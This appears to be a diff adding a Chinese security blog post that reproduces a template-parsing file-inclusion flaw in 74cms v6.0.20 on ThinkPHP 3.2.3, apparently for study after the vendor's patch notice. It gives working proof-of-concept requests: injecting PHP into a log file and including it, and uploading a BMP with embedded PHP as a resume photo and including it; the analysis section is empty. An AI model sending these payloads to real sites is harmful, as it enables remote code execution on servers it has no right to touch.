@@ -1,0 +1,34 @@
+<hr>
+<p>title: 骑士cms存在模板解析漏洞<br>no-emoji: false<br>date: 2020-12-15 10:27:32<br>tags:<br>top:</p>
+<hr>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>前端时间，骑士cms 发布了<a href="http://www.74cms.com/news/show-2497.html">紧急风险漏洞升级通知</a>，网上也有不少分析的文章，骑士cms 利用了 Thinkphp3.2.3 的框架，所以就想分析一下这个漏洞，对 Thinkphp3.2.3 的框架有一个初步的了解。</p>
+<!-- more -->
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>我们选用<br><a href="http://www.74cms.com/download/load/id/808.html">74cms v6.0.20</a>作为复现的版本，选取 phpstudy 自带的 apache + mysql 环境来进行安装。<br>根据官网发布的信息，我们大致可以判断出漏洞存在的位置是<br><code>\Common\Controller\BaseController::assign_resume_tpl</code><br><img src="20201215150155.png"></p>
+<p>我们在函数内部加入断点，根据函数存在位置，属于 Common 模块下的 Base 控制器中的assign_resume_tpl ，构造路由<br><code>http://74cms.test/index.php?m=common&amp;c=base&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=2</code><br>并不能直接进入断点位置<br>然后我就直接搜索了 错误信息 <code> [ WE CAN DO IT JUST THINK ]</code> 通过一步一步向上寻找错误触发的位置，发现是无法加载模块：Common<br><code>\Think\Think::halt</code><br><img src="20201217113329.png"><br><code>\Think\Think::appException</code><br><img src="20201217111042.png"><br><code>ThinkPHP/Library/Think/Dispatcher.class.php</code><br><img src="20201217113146.png"></p>
+<p>最后发现在加载模块时会检测模块名，无法加载 Common 模块。Common 模块无法直接调用，所以我们需要找其他方法调用 Common 模块下的 Base 控制器中的assign_resume_tpl 方法。<br>我们注意到 Home 模块下的 IndexController 继承 FrontendController<br><img src="20201217131237.png"><br>FrontendController 继承 BaseController<br><img src="20201217131343.png"></p>
+<p>所以我们通过构造路由<br><code>http://74cms.test/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=2</code><br><img src="20201217131553.png"></p>
+<hr>
+<p>在第一次进行调试分析时，在关键地方加上断点，死活都进入不到断点定位的位置，但是相关功能已经执行，然后我发现会跟进一个文件 <code>common~runtime.php</code> 这个文件中乱七八糟的，但是里面的内容又好像是代码，通过查阅资料发现<code>ThinkPHP的编译缓存文件~runtime.php</code><br><del>runtime.php 中缓存的编译内容，相当于把 index.php 引导的所有操作全部集成到 ~runtime.php 文件中。有了这个缓存的编译文件，index.php 在下次运行时，不再引导，而是直接检测是否存在 ~runtime.php 编译缓存文件，如果在，则直接运行 ~runtime.php。<br>我就将文件夹下的 common</del>runtime.php 删除，就实现了调试自由。</p>
+<hr>
+<h3 id="通过包含日志实现命令执行"><a href="#通过包含日志实现命令执行" class="headerlink" title="通过包含日志实现命令执行"></a>通过包含日志实现命令执行</h3><pre><code class="POC">http://74cms.test/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl
+POST:
+variable=1&amp;tpl=&lt;?php phpinfo(); ob_flush();?&gt;/r/n&lt;qscms/company_show 列表名=&quot;info&quot; 企业id=&quot;$_GET[&#39;id&#39;]&quot;/&gt;</code></pre>
+<p><img src="20201217145744.png"><br><code>data/Runtime/Logs/Home/20_12_17.log</code><br><img src="20201217145718.png"></p>
+<pre><code class="POC">http://74cms.test/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl
+POST:
+variable=1&amp;tpl=data/Runtime/Logs/Home/20_12_17.log</code></pre>
+<p><img src="20201217150011.png"></p>
+<h3 id="通过包含图片实现命令执行"><a href="#通过包含图片实现命令执行" class="headerlink" title="通过包含图片实现命令执行"></a>通过包含图片实现命令执行</h3><p>bmp 图片</p>
+<pre><code class="bmp">#define test_width 16
+#define test_height 7
+&lt;?php phpinfo();die();?&gt;
+static char test_bits[] = {
+0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,
+0x00, 0x60 };</code></pre>
+<p>注册普通用户完善自己的信息时，在上传照片/作品处上传构造的恶意文件<br><img src="20201217162755.png"><br>查看上传成功的文件位置<br><img src="20201217162942.png"></p>
+<pre><code class="POC">http://74cms.test/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl
+variable=1&amp;tpl=data/upload/resume_img/2012/17/5fdb0459bba6a.bmp</code></pre>
+<p><img src="20201217153821.png"></p>
+<p>在本地利用的是 windows 环境下的 phpstudy-php5.5.9，<a href="https://www.cnblogs.com/r00tuser/">水泡泡</a>师傅指点说，这个 trick 仅仅适用于 phpstudy 特定的 php 版本中才可以利用成功。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="通过包含日志实现命令执行-1"><a href="#通过包含日志实现命令执行-1" class="headerlink" title="通过包含日志实现命令执行"></a>通过包含日志实现命令执行</h3><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2>
